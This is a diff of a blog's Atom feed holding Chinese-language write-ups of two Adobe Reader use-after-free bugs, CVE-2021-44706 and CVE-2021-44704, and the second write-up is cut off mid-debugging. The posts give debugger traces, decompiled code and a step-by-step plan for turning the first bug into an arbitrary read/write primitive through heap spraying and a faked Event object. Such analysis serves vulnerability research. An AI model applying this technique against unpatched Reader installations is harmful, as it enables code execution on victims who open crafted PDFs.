@@ -1,4 +1,1471 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-19T18:04:15+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Joey</title><subtitle>Joey&apos;s blog</subtitle><entry><title type="html">CVE-2021-44711 Adobe Reader整数溢出漏洞分析与利用</title><link href="http://localhost:4000/2022-09-09/CVE-2021-44711" rel="alternate" type="text/html" title="CVE-2021-44711 Adobe Reader整数溢出漏洞分析与利用" /><published>2022-09-09T00:00:00+08:00</published><updated>2022-09-09T00:00:00+08:00</updated><id>http://localhost:4000/2022-09-09/CVE-2021-44711</id><content type="html" xml:base="http://localhost:4000/2022-09-09/CVE-2021-44711"><![CDATA[<h1 id="前言">前言</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-26T11:34:29+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Joey</title><subtitle>Joey&apos;s blog</subtitle><entry><title type="html">CVE-2021-44706 Adobe Reader UAF漏洞分析与利用</title><link href="http://localhost:4000/2023-05-26/CVE-2021-44706" rel="alternate" type="text/html" title="CVE-2021-44706 Adobe Reader UAF漏洞分析与利用" /><published>2023-05-26T00:00:00+08:00</published><updated>2023-05-26T00:00:00+08:00</updated><id>http://localhost:4000/2023-05-26/CVE-2021-44706</id><content type="html" xml:base="http://localhost:4000/2023-05-26/CVE-2021-44706"><![CDATA[<h1 id="漏洞简介">漏洞简介</h1>
+
+<p>该漏洞也是2021年天府杯中出现的Adobe Reader漏洞，由<a href="https://twitter.com/bee13oy">@bee13oy</a>发现并利用。漏洞位于<code class="language-plaintext highlighter-rouge">EScript.api</code>模块，对应的Adobe Reader版本为：21.007.20099。<!--more--></p>
+
+<h1 id="漏洞原理">漏洞原理</h1>
+
+<p>该漏洞由于递归执行<code class="language-plaintext highlighter-rouge">Collab.registerReview</code>导致原本的通过<code class="language-plaintext highlighter-rouge">Collab.registerApproval</code>注册的事件被更改。被更改后原本的事件对象被释放，但在执行<code class="language-plaintext highlighter-rouge">Collab.registerReview</code>时仍然访问了被释放后的事件对象，造成了UAF。</p>
+
+<p>开启page heap后，调试崩溃于<code class="language-plaintext highlighter-rouge">EScript+0x3E9C0</code>函数内，可以看出由于参数2存放了非法地址导致了崩溃：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=47f72fb8 ebx=30368fc0 ecx=39d14ff0 edx=30368fc0 esi=39d14ff0 edi=4a52afb8
+eip=6e5be9d5 esp=00969e4c ebp=00969e50 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+EScript!mozilla::HashBytes+0x2cc85:
+6e5be9d5 8b4004          mov     eax,dword ptr [eax+4] ds:002b:47f72fbc=????????
+
+EScript+0x3E9C0：
+6e5be9c0 55              push    ebp
+6e5be9c1 8bec            mov     ebp,esp
+6e5be9c3 56              push    esi
+6e5be9c4 8b7508          mov     esi,dword ptr [ebp+8]
+6e5be9c7 56              push    esi
+6e5be9c8 e8ecfcffff      call    EScript!mozilla::HashBytes+0x2c969 (6e5be6b9)
+6e5be9cd 8b450c          mov     eax,dword ptr [ebp+0Ch]
+6e5be9d0 59              pop     ecx
+6e5be9d1 85c0            test    eax,eax
+6e5be9d3 7412            je      EScript!mozilla::HashBytes+0x2cc97 (6e5be9e7)
+6e5be9d5 8b4004          mov     eax,dword ptr [eax+4] ds:002b:47f72fbc=????????
+</code></pre></div></div>
+
+<p>向前回溯后可知该崩溃地址由父函数的参数3传递：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int *__cdecl fcrash(int a1, __int16 a2, int a3)
+{
+  int *v3; // esi
+
+  v3 = (int *)sub_1003E5D0(a1, a2);
+  crash(v3, a3);    //崩溃函数
+  return v3;
+}
+</code></pre></div></div>
+
+<p>继续向前回溯，发现非法地址ptr是由<code class="language-plaintext highlighter-rouge">sub_10054127</code>产生，参数为<code class="language-plaintext highlighter-rouge">EScript+0x277C60</code>：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>_DWORD *ffcrash()
+{
+  _DWORD *v0; // edi
+  int v1; // esi
+  int v2; // eax
+  int v3; // ebx
+  int v4; // esi
+  int v5; // eax
+  int v6; // eax
+  int v7; // eax
+  int v8; // eax
+  int v9; // eax
+  int *v11; // [esp-4h] [ebp-2Ch]
+  int ptr; // [esp+18h] [ebp-10h]
+
+  v0 = 0;
+  if ( dword_10277C70 )
+  {
+    v1 = dword_10277C70 - 1;
+    v0 = *(_DWORD **)sub_10054127(dword_10277C60);
+    v2 = dword_10277C6C;
+    if ( !v1 )
+      v2 = 0;
+    dword_10277C70 = v1;
+    dword_10277C6C = v2;
+    v3 = sub_100417F0((int)v0);
+    sub_1003BDF0(v3);
+    if ( dword_10277C70 )
+    {
+      ptr = *(_DWORD *)sub_10054127(dword_10277C60); //非法地址由该函数产生
+    }
+    else
+    {
+      ptr = sub_1003E460(v0, 1);
+      sub_1005A465();
+    }
+    v4 = sub_1003D840(v3);
+    sub_1004B200(1);
+    v5 = sub_1003EAC0(v3, 1, (wchar_t *)"event");
+    sub_10042130(v4, v5, 0);
+    v6 = sub_1003EAC0(v3, 1, (wchar_t *)"event");
+    sub_10043890(v4, v6, 0);
+    sub_1004B210(v4, (wchar_t *)"event");
+    v11 = fcrash(v3, 1, ptr);  //崩溃函数的父函数
+    v7 = sub_1003EAC0(v3, 1, (wchar_t *)"event");
+    sub_1003ED90(v4, v7, v11);
+    v8 = sub_1003EAC0(v3, 1, (wchar_t *)"event");
+    sub_10042130(v4, v8, 1);
+    v9 = sub_1003EAC0(v3, 1, (wchar_t *)"event");
+    sub_10043890(v4, v9, 1);
+    sub_1004B200(0);
+    sub_1003CDD0(v3);
+  }
+  return v0;
+}
+</code></pre></div></div>
+
+<p>分析<code class="language-plaintext highlighter-rouge">sub_10054127</code>可以得到被释放的地址<code class="language-plaintext highlighter-rouge">0x47f72fb8</code>，说明该地址被提前释放导致了崩溃的发生：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:10054127 ; int __thiscall sub_10054127(_DWORD *this)
+.text:10054127 sub_10054127    proc near               ; CODE XREF: sub_10054110+F↑p
+.text:10054127                                         ; ffcrash+21↓p ...
+.text:10054127                 push    ebp
+.text:10054128                 mov     ebp, esp
+.text:1005412A                 push    ecx
+.text:1005412B                 push    ecx
+.text:1005412C                 push    esi
+.text:1005412D                 mov     esi, ecx
+.text:1005412F                 mov     eax, [esi+10h]
+.text:10054132                 add     eax, [esi+0Ch]
+.text:10054135                 lea     edx, [eax-1]
+.text:10054138                 mov     eax, [esi+8]
+.text:1005413B                 mov     ecx, edx
+.text:1005413D                 shr     ecx, 2
+.text:10054140                 dec     eax
+.text:10054141                 and     ecx, eax
+.text:10054143                 mov     eax, [esi+4]
+.text:10054146                 and     edx, 3
+.text:10054149                 pop     esi
+.text:1005414A                 mov     eax, [eax+ecx*4]
+.text:1005414D                 lea     eax, [eax+edx*4]
+.text:10054150                 leave
+.text:10054151                 retn
+.text:10054151 sub_10054127    endp
+
+0:000&gt; dd EScript+277c60 L10 //this
+6e7f7c60  2fee6ff8 0ea12fe0 00000008 00000000
+6e7f7c70  00000002 12e103ff 12e112e2 12dd12dc
+6e7f7c80  ffffffff 80000013 00000001 00000000
+6e7f7c90  00000000 00000000 00000000 00000000
+0:000&gt; dd 0ea12fe0 L10
+0ea12fe0  2b840ff0 00000000 00000000 00000000
+0ea12ff0  00000000 00000000 00000000 00000000
+0ea13000  ???????? ???????? ???????? ????????
+0ea13010  ???????? ???????? ???????? ????????
+0:000&gt; dd 2b840ff0 L10
+2b840ff0  3babafb8 47f72fb8 4a52afb8 c0c0c0c0
+2b841000  ???????? ???????? ???????? ????????
+2b841010  ???????? ???????? ???????? ????????
+2b841020  ???????? ???????? ???????? ????????
+0:000&gt; dd 47f72fb8 L10 //ptr
+47f72fb8  ???????? ???????? ???????? ????????
+47f72fc8  ???????? ???????? ???????? ????????
+47f72fd8  ???????? ???????? ???????? ????????
+47f72fe8  ???????? ???????? ???????? ????????
+</code></pre></div></div>
+
+<p>重新调试，查看崩溃的内存地址是存在的，下断在free函数，设置当free地址为崩溃内存地址时停下，可以确认漏洞触发的原因就是由于提前释放了Event对象导致的非法内存访问：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:017&gt; dd poi(poi(poi(EScript+277c60 +4))+4)  //崩溃Event对象地址0x1c076fb8，大小为0x48
+1c076fb8  36af8fc0 36f24e48 00000000 2f276fb0
+1c076fc8  43c3ef80 00000000 00000000 00000000
+1c076fd8  00000000 00000000 00000000 00000000
+1c076fe8  00000000 6f4cc780 c0c0c000 00000000
+1c076ff8  00000000 00000000 ???????? ????????
+1c077008  ???????? ???????? ???????? ????????
+1c077018  ???????? ???????? ???????? ????????
+1c077028  ???????? ???????? ???????? ????????
+0:000&gt; da 2f276fb0
+2f276fb0  "Event"
+0:017&gt; bp ucrtbase!free ".if(poi(esp+4)=0x1c076fb8){}.else{gc}";g
+eax=0ea8bd80 ebx=36f24e48 ecx=7545ec00 edx=00002041 esi=7545ec00 edi=1c076fb8
+eip=7545ec00 esp=00558fec ebp=00558ff8 iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
+ucrtbase!free:
+7545ec00 8bff            mov     edi,edi
+0:000&gt; g  //崩溃的原因为提前释放的0x48大小的Event对象导致
+(3d4.b0c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=1c076fb8 ebx=36af8fc0 ecx=694daff0 edx=36af8fc0 esi=694daff0 edi=73742fb8
+eip=6f49e9d5 esp=0055a84c ebp=0055a850 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+EScript!mozilla::HashBytes+0x2cc85:
+6f49e9d5 8b4004          mov     eax,dword ptr [eax+4] ds:002b:1c076fbc=????????
+</code></pre></div></div>
+
+<h1 id="漏洞利用">漏洞利用</h1>
+
+<p>此类UAF漏洞的利用步骤都大致相同，分析能否实现越界写或内存释放是关键。本人分析后只找到了实现内存释放的条件，具体的思路如下：</p>
+
+<ol>
+  <li>使用0x48大小的无意义字符串占用被释放的Event对象的内存空间</li>
+  <li>通过分析后找到了能够实现内存释放的条件，构造特殊字符串用于触发内存释放</li>
+  <li>通过堆喷射ArrayBuffer对象实现指定内存地址的占位</li>
+  <li>触发漏洞后喷射特殊的字符串触发内存释放，释放堆喷射占位的指定内存地址的ArrayBuffer对象</li>
+  <li>释放完毕后立即创建同等大小的字符串占用ArrayBuffer对象的内存，使得ArrayBuffer对象的byteLength为0xffffffff</li>
+  <li>通过该任意内存读写原语实现代码执行</li>
+</ol>
+
+<h2 id="寻找利用点">寻找利用点</h2>
+
+<p>在漏洞触发的函数中添加释放0x48大小的无意义字符串代码，执行后的效果如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(168.c70): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00949ae8 ebx=41414141 ecx=ecedf400 edx=6fc85690 esi=00000000 edi=00000008
+eip=6fb10ff8 esp=00949abc ebp=00949aec iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+EScript!mozilla::HashBytes+0x2f2a8:
+6fb10ff8 ff74bb40        push    dword ptr [ebx+edi*4+40h] ds:002b:414141a1=????????
+0:000&gt; dd poi(poi(poi(EScript+277c60 +4))+4)
+0c964650  41414141 41414141 41414141 41414141
+0c964660  41414141 41414141 41414141 41414141
+0c964670  41414141 41414141 41414141 41414141
+0c964680  41414141 41414141 41414141 41414141
+0c964690  41414141 00004141 949c1995 8c021200
+0c9646a0  00000000 0c54e0b8 00000000 00000000
+0c9646b0  00000000 00000000 00000000 00000000
+0c9646c0  00000000 00000000 00000000 00000000
+</code></pre></div></div>
+
+<p>字符串成功占用被释放的Event对象，在后续读取该对象的数据时发生了内存访问异常，接下来的工作就是分析能否通过构造特殊的字符串实现越界写和内存释放。</p>
+
+<p>查看该函数后可知由于参数1为0x41414141导致后续获取该内存时出错：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int __cdecl sub_10040FC4(int a1, char *Str1)
+{
+  int v2; // esi
+  int v3; // eax
+  int v4; // edi
+  int v5; // eax
+  int v7; // [esp+Ch] [ebp-4h] BYREF
+
+  v2 = 0;
+  v3 = sub_10003164(Str1, 0x7FFFFFFF, 0);
+  v4 = sub_1004067E(Str1, v3, 0xF00F) &amp; 0xF;
+  v5 = sub_1004089E(*(_DWORD *)(a1 + 4 * v4), *(_DWORD *)(a1 + 4 * v4 + 0x40), Str1, (int)&amp;v7);// crash
+  if ( (_WORD)v7 )
+    return *(_DWORD *)(*(_DWORD *)(a1 + 4 * v4) + 8 * v5 + 4);
+  return v2;
+}
+</code></pre></div></div>
+
+<p>继续向上回溯，通过深入分析后在<code class="language-plaintext highlighter-rouge">sub_100461B0</code>找到了内存释放的条件：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int __cdecl sub_10046150(int a1, char *Str1)
+{
+  unsigned int v2; // ecx
+  int v4; // edi
+  int v5; // eax
+  unsigned int v7; // [esp-4h] [ebp-Ch]
+  unsigned int v8; // [esp-4h] [ebp-Ch]
+
+  v4 = 0;
+  while ( a1 )
+  {
+    if ( *(_DWORD *)(a1 + 0x10) )
+    {
+      v4 = sub_10040FC4(*(_DWORD *)(a1 + 0x10), Str1);// crash
+      v2 = v7;
+      if ( v4 )
+        return v4;
+    }
+    else
+    {
+      v4 = 0;
+    }
+    if ( !sub_1000279F(v2, Str1, "Dead") )
+      break;
+    v5 = sub_100461B0((int *)a1, 1);	//深入分析找到内存释放的条件
+    v2 = v8;
+    a1 = v5;
+  }
+  return v4;
+}
+</code></pre></div></div>
+
+<p>该函数位于<code class="language-plaintext highlighter-rouge">sub_100461B0</code>函数的深处，其内部函数<code class="language-plaintext highlighter-rouge">sub_1003D01A</code>调用了free函数释放内存，而该函数的调用需要满足判断条件才会执行：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int __thiscall sub_1003CD44(_DWORD *this)
+{
+  int v2; // ecx
+
+  v2 = 0x20 - *this;
+  if ( this[3] + this[1] &gt;= (unsigned int)(0xC0 * (1 &lt;&lt; v2)) &gt;&gt; 8 )
+    return sub_1003D01A(this[3] &lt; (unsigned int)(1 &lt;&lt; v2) &gt;&gt; 2);// free
+  else
+    return 0;
+}
+</code></pre></div></div>
+
+<h2 id="构造读写原语">构造读写原语</h2>
+
+<p>经过不断的调试和构造，成功让程序执行到了该处，具体的内存结构如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; t
+eax=20221290 ebx=00000001 ecx=2021018c edx=00000000 esi=00969af8 edi=2021018c
+eip=6fb0cd44 esp=00969aa8 ebp=00969ab8 iopl=0         nv up ei ng nz ac pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
+EScript!mozilla::HashBytes+0x2aff4:
+6fb0cd44 56              push    esi
+0:000&gt; dd poi(poi(poi(EScript+277c60 +4))+4) L12 //伪造的Event对象，填充地址为堆喷的指定内存
+2dababd8  202100a8 202100d8 00000000 00000000
+2dababe8  00000000 00000000 00000000 00000000
+2dababf8  00000000 00000000 00000000 00000000
+2dabac08  00000000 202100d8 00000000 00000000
+2dabac18  00000000 00000000
+0:016&gt; dd 20210058 L18	//202100a8所指向的内存结构，防止程序报错
+20210058  00000000 00000000 00000000 00000000
+20210068  20210078 00000000 00000000 00000000
+20210078  00000000 00000000 00000000 00000000
+20210088  00000000 00000000 00000000 00000000
+20210098  00000000 00000000 00000000 00000000
+202100a8  20210068 00000000 00000000 00000000
+0:000&gt; dd 202100d8 L34	//202100d8所指向的内存结构，防止程序报错
+202100d8  202100e8 00000000 00000000 00000000
+202100e8  202100f8 20210108 00000000 00000000
+202100f8  00000000 20210118 00000000 00000000
+20210108  00000000 00000000 00000000 00000000
+20210118  20210118 00000000 00000000 00000000
+20210128  00000000 00000000 00000000 00000000
+20210138  00000000 00000000 00000000 00000000
+20210148  00000000 00000000 00000000 00000000
+20210158  00000000 00000000 00000000 00000000
+20210168  00000000 00000000 00000000 00000000
+20210178  00000000 00000000 00000000 00000000
+20210188  00000000 00000018 000000c0 00000000
+20210198  00000000 20220048 00000000 00000000
+</code></pre></div></div>
+
+<p>此时this指针为<code class="language-plaintext highlighter-rouge">0x2021018C</code>，通过计算后刚好符合执行<code class="language-plaintext highlighter-rouge">sub_1003D01A</code>的条件，该函数最终会释放this[4]所指向的内存：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int __thiscall sub_1003D01A(void *this, int a2)
+{
+  int v3; // esi
+  int v4; // esi
+  void *v5; // eax
+  char v6; // cl
+  void *v7; // edx
+  _DWORD *v8; // edi
+  _DWORD *v9; // esi
+  unsigned int *v10; // eax
+  size_t v12; // [esp-4h] [ebp-1Ch]
+  char v13[4]; // [esp+8h] [ebp-10h] BYREF
+  unsigned int v14; // [esp+Ch] [ebp-Ch]
+  void *Block; // [esp+10h] [ebp-8h]
+  unsigned int v16; // [esp+14h] [ebp-4h]
+
+  Block = (void *)*((_DWORD *)this + 4);
+  v3 = a2 - *(_DWORD *)this;
+  v16 = *(_DWORD *)this;
+  v4 = v3 + 0x20;
+  if ( (unsigned int)(1 &lt;&lt; v4) &gt; 0x1000000 )
+    return 2;
+  v12 = 1;
+  _mm_lfence();
+  v5 = calloc(0x18 * (1 &lt;&lt; v4), v12);
+  if ( !v5 )
+    return 2;
+  *((_DWORD *)this + 3) = 0;
+  *((_DWORD *)this + 4) = v5;
+  v6 = 0x20 - v16;
+  v7 = Block;
+  v8 = Block;
+  ++*((_DWORD *)this + 2);
+  *(_DWORD *)this = 0x20 - v4;
+  v14 = (unsigned int)&amp;v8[6 * (1 &lt;&lt; v6)];
+  if ( (unsigned int)v8 &lt; v14 )
+  {
+    do
+    {
+      if ( *v8 &gt; 1u )
+      {
+        v16 = *v8 &amp; 0xFFFFFFFE;
+        v9 = (_DWORD *)sub_1001545A(v13, v8 + 2);
+        v10 = (unsigned int *)sub_1003F925(v16);
+        *v10 = v16;
+        sub_1003CD7E(*v9);
+      }
+      v8 += 6;
+    }
+    while ( (unsigned int)v8 &lt; v14 );
+    v7 = Block;
+  }
+  free(v7);
+  return 1;
+}
+</code></pre></div></div>
+
+<p>通过上述伪造的Event对象结构成功释放了<code class="language-plaintext highlighter-rouge">0x20220048</code>的ArrayBuffer对象，随后再通过字符串占用被释放的内存，任意内存读写原语构造完毕：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; 
+eax=00000000 ebx=2021018c ecx=00000000 edx=20220048 esi=00969a84 edi=20221848
+eip=6fb0d0d0 esp=00969a74 ebp=00969a94 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+EScript!mozilla::HashBytes+0x2b380: //free(v7)
+6fb0d0d0 ff154022c86f    call    dword ptr [EScript!double_conversion::DoubleToStringConverter::ToPrecision+0x224d0 (6fc82240)] ds:002b:6fc82240={ucrtbase!free (7545ec00)}
+0:000&gt; t
+eax=00000000 ebx=2021018c ecx=00000000 edx=20220048 esi=00969a84 edi=20221848
+eip=7545ec00 esp=00969a70 ebp=00969a94 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+ucrtbase!free:
+7545ec00 8bff            mov     edi,edi
+0:000&gt; dps esp+4 L1
+00969a74  20220048
+0:000&gt; dd 20220048	//未被释放的ArrayBuffer对象
+20220048  00000000 0000ffe8 00000000 00000000
+20220058  00000000 00000000 00000000 00000000
+20220068  20210078 00000000 00000000 00000000
+20220078  00000000 00000000 00000000 00000000
+20220088  00000000 00000000 00000000 00000000
+20220098  00000000 00000000 00000000 00000000
+202200a8  20210068 00000000 00000000 00000000
+202200b8  00000000 00000000 00000000 00000000
+0:000&gt; gu
+eax=00000001 ebx=2021018c ecx=05010000 edx=05010000 esi=00969a84 edi=20221848
+eip=6fb0d0d6 esp=00969a74 ebp=00969a94 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+EScript!mozilla::HashBytes+0x2b386:
+6fb0d0d6 59              pop     ecx
+0:000&gt; dd 20220048	//被释放后的ArrayBuffer对象
+20220048  050100c0 13970fe8 00000000 00000000
+20220058  00000000 00000000 00000000 00000000
+20220068  20210078 00000000 00000000 00000000
+20220078  00000000 00000000 00000000 00000000
+20220088  00000000 00000000 00000000 00000000
+20220098  00000000 00000000 00000000 00000000
+202200a8  20210068 00000000 00000000 00000000
+202200b8  00000000 00000000 00000000 00000000
+......
+//通过字符串占用被释放的内存，byteLength变为0xffffffff，读写原语构造完毕
+0:017&gt; dd 20220048
+20220048  42424141 ffffffff 00000000 00000000
+20220058  00000000 00000000 00000000 00000000
+20220068  00000000 00000000 00000000 00000000
+20220078  00000000 00000000 00000000 00000000
+20220088  00000000 00000000 00000000 00000000
+20220098  00000000 00000000 00000000 00000000
+202200a8  00000000 00000000 00000000 00000000
+202200b8  00000000 00000000 00000000 00000000
+</code></pre></div></div>
+
+<p>任意地址读写原语构造完毕后，剩下的就是公式化的利用读写原语实现代码执行了，漏洞利用到此结束。</p>
+
+<h1 id="总结">总结</h1>
+
+<p>该漏洞是一个典型的UAF漏洞，通过寻找内存释放的条件最终实现了读写原语的构造。难点一在于寻找内存释放的条件，该函数隐藏在比较深入的地方，必须经过长时间的尝试与分析才能找到这一利用点。难点二在于构造伪造的Event对象，该对象需要符合程序解析的代码，一旦有所偏差程序就会崩溃或进入死循环，需要通过大量的尝试才能稳定利用。</p>]]></content><author><name>Joey</name></author><category term="漏洞利用" /><summary type="html"><![CDATA[漏洞简介 该漏洞也是2021年天府杯中出现的Adobe Reader漏洞，由@bee13oy发现并利用。漏洞位于EScript.api模块，对应的Adobe Reader版本为：21.007.20099。]]></summary></entry><entry><title type="html">CVE-2021-44704 Adobe Reader UAF漏洞分析与利用</title><link href="http://localhost:4000/2022-11-24/CVE-2021-44704" rel="alternate" type="text/html" title="CVE-2021-44704 Adobe Reader UAF漏洞分析与利用" /><published>2022-11-24T00:00:00+08:00</published><updated>2022-11-24T00:00:00+08:00</updated><id>http://localhost:4000/2022-11-24/CVE-2021-44704</id><content type="html" xml:base="http://localhost:4000/2022-11-24/CVE-2021-44704"><![CDATA[<h1 id="前言">前言</h1>
+
+<p>该漏洞为2021年天府杯中使用的Adobe Reader UAF漏洞，漏洞位于<code class="language-plaintext highlighter-rouge">Annots.api</code>模块，对应的Adobe Reader版本为：21.007.20099。<!--more--></p>
+
+<h1 id="原理分析">原理分析</h1>
+
+<p>开启pageheap后，打开POC，崩溃于<code class="language-plaintext highlighter-rouge">Annots+6aabb</code>处：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
+(18b8.136c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=04afc5fc ebx=4ac2cffc ecx=567e8fa0 edx=04afc574 esi=57536ff4 edi=567e8fa0
+eip=6c55aabb esp=04afc5e8 ebp=04afc608 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+Annots!PlugInMain+0x4cc8b:
+6c55aabb 8b772c          mov     esi,dword ptr [edi+2Ch] ds:002b:567e8fcc=????????
+0:000&gt; k
+ # ChildEBP RetAddr  
+WARNING: Stack unwind information not available. Following frames may be wrong.
+00 04afc608 6c5bebd8 Annots!PlugInMain+0x4cc8b
+01 04afc640 6c5bc872 Annots!PlugInMain+0xb0da8
+02 04afc714 6c5bed43 Annots!PlugInMain+0xaea42
+03 04afc72c 6cdf3f47 Annots!PlugInMain+0xb0f13
+04 04afc870 6cdd86ff EScript!mozilla::HashBytes+0x421f7
+05 04afc8e4 6cdd3495 EScript!mozilla::HashBytes+0x269af
+06 04afcd50 6cdd23eb EScript!mozilla::HashBytes+0x21745
+07 04afcd94 6cdd22fb EScript!mozilla::HashBytes+0x2069b
+08 04afcdd0 6cdd2230 EScript!mozilla::HashBytes+0x205ab
+09 04afce04 6cdbb630 EScript!mozilla::HashBytes+0x204e0
+0a 04afce54 6cdfa956 EScript!mozilla::HashBytes+0x98e0
+0b 04afced8 6cdfa65b EScript!mozilla::HashBytes+0x48c06
+0c 04afd08c 6cdf9fd6 EScript!mozilla::HashBytes+0x4890b
+0d 04afd0d8 6cdf8db3 EScript!mozilla::HashBytes+0x48286
+0e 04afd178 6ce76ebf EScript!mozilla::HashBytes+0x47063
+......
+</code></pre></div></div>
+
+<p>查看该函数可以明显看到由于this指针指向了非法地址导致：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>_DWORD *__thiscall sub_2216AAAD(int this)
+{
+  _DWORD *v2; // esi
+
+  v2 = *(_DWORD **)(this + 0x2C);	//crash		
+  if ( !v2 )
+  {
+    v2 = (_DWORD *)alloc_0((wchar_t *)this, 0xC, 1);
+    if ( v2 )
+    {
+      *v2 = 0;
+      v2[1] = 0;
+      *v2 = sub_221234C9(v2);		// 初始化v2
+    }
+    else
+    {
+      v2 = 0;
+    }
+    *(_DWORD *)(this + 0x2C) = v2;
+  }
+  return v2;
+}
+</code></pre></div></div>
+
+<p>于是向上回溯找到了漏洞函数<code class="language-plaintext highlighter-rouge">Annots+CC5EA</code>，该函数获取了指向非法地址的this指针：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__int16 __thiscall sub_221CC5EA(void *this, wchar_t *a2, wchar_t *a3, int a4)
+{
+  v19[2] = (uintptr_t)this;
+  v24 = (wchar_t *)a4;
+  v27 = a3;
+  v4 = (wchar_t *)(*(int (__cdecl **)(wchar_t *))(vtable + 0xF4))(a3);// v4 = *a3
+  v26 = (wchar_t *)0xFFFFFFFF;
+......	//省略无关函数
+  if ( (int)v26 &gt;= 0 )
+    sub_2226B498((void *)dword_22748BEC, v6, v26, (int)&amp;object, v28, v30 != 0, v29);// 获取Annotation对象，存储于object
+  else
+    sub_221599FC((char)v6, &amp;object, v28, v30 != 0, v29);
+  if ( (unsigned int)((char *)object_end - (char *)object) &lt; 4 )
+  {
+    (*(void (__cdecl **)(wchar_t *, _DWORD))(vtable + 0x80))(v24, 0);
+  }
+  else
+  {
+    addr = (wchar_t *)(*(int (__cdecl **)(unsigned int))(dword_22747444 + 4))(((char *)object_end - (char *)object) &amp; 0xFFFFFFFC);	// malloc object size
+    v10 = (int *)object;
+    v11 = addr;
+    v12 = object_end;
+    v27 = addr;
+    if ( object != object_end )
+    {
+      do
+      {
+        v13 = vtable;
+        v14 = sub_221CEBB7(v25, *v10, 0);       // 崩溃函数的上层函数，v10存储的正是this指针
+        *(_DWORD *)v11 = (*(int (__thiscall **)(_DWORD, wchar_t *, int, int))(v13 + 0x40))(
+                           *(_DWORD *)(v13 + 0x40),
+                           v25,
+                           1,
+                           v14);
+        ++v10;
+        v12 = object_end;
+        v11 += 2;
+      }
+      while ( v10 != (int *)object_end );
+      v10 = (int *)object;
+      v11 = v27;
+    }
+......	//省略无关函数
+}
+</code></pre></div></div>
+
+<p>在调试器中可以更清晰的看到该函数通过<code class="language-plaintext highlighter-rouge">sub_2226B498</code>获取Annotation对象的过程：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
+Breakpoint 1 hit
+eax=0536d704 ebx=2c916bd0 ecx=2bea8ef0 edx=00104004 esi=00000000 edi=57d4afb8
+eip=6e9cc80e esp=0536d6cc ebp=0536d7a4 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+Annots!PlugInMain+0xae9de:
+6e9cc80e e885ec0900      call    Annots!PlugInMain+0x14d668 (6ea6b498)	//获取Annotation对象
+0:000&gt; dps esp L6
+0536d6cc  2c916bd0
+0536d6d0  00000000
+0536d6d4  0536d704		//该处存放获取的Annotation对象
+0536d6d8  00000000
+0536d6dc  00000000
+0536d6e0  00000008
+0:000&gt; dd 0536d704 L4	//未获取前为空
+0536d704  00000000 00000000 00000000 3b2c7800
+0:000&gt; p
+eax=00000002 ebx=2c916bd0 ecx=6ea6b691 edx=00000003 esi=00000000 edi=57d4afb8
+eip=6e9cc813 esp=0536d6e4 ebp=0536d7a4 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
